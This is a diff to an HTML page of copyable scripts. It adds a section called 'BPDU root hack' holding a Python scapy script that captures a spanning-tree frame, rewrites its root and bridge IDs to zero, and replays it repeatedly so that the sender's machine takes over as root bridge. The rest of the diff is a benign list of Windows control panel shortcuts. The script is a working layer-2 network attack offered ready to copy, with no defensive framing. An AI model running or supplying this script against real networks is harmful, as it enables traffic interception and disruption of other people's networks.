@@ -192,9 +192,40 @@ if __name__ == "__main__":
                 <button class="copy-btn" onclick="copyScript('script3')">Copy</button>
             </div>
 
-                <p><strong>List of windows shortcuts</strong></p>
+            <p><strong>BPDU root hack</strong></p>
+            <li><em>python script that makes you the root bridge</em></li>
             <div class="script-box">
                 <pre id="script4">
+#!/usr/bin/env python3
+#Import scapy
+from scapy.all import *
+#Capture STP frame (ether dst is dest mac of spanning tree)
+pkt = sniff(filter="ether dst 01:80:c2:00:00:00",count=1)
+#Change the MAC address in the frame to the followuing:
+pkt[0].src="00:00:00:00:00:01"
+#Set rootid
+pkt[0].rootid=0
+#Set rootmac
+pkt[0].rootmac="00:00:00:00:00:01"
+#Set bridgeid
+pkt[0].bridgeid=0
+#Set bridgemac
+pkt[0].bridgemac="00:00:00:00:00:01"
+#Show changed frame
+pkt[0].show()
+#Loop to send multiple frames into the network:
+for i in range (0,50):
+    #Send changed frame back into the network:
+    sendp(pkt[0], loop=0, verbose=1)
+    #Sleep / wait for one second:
+    time.sleep(1)
+                </pre>
+                <button class="copy-btn" onclick="copyScript('script4')">Copy</button>
+            </div>
+
+            <p><strong>List of windows shortcuts</strong></p>
+            <div class="script-box">
+                <pre id="script00">
 ncpa.cpl     |  Network Connections
 sysdm.cpl    |  System Properties
 inetcpl.cpl  |  Internet Properties
@@ -202,8 +233,9 @@ firewall.cpl |  Windows Firewall Settings
 hdwwiz.cpl   |  Device Manager
 netplwiz     |  User Accounts
                 </pre>
-                <button class="copy-btn" onclick="copyScript('script4')">Copy</button>
+                <button class="copy-btn" onclick="copyScript('script00')">Copy</button>
             </div>
+
               
                 <p><strong>empty box...</strong></p>
             <div class="script-box">
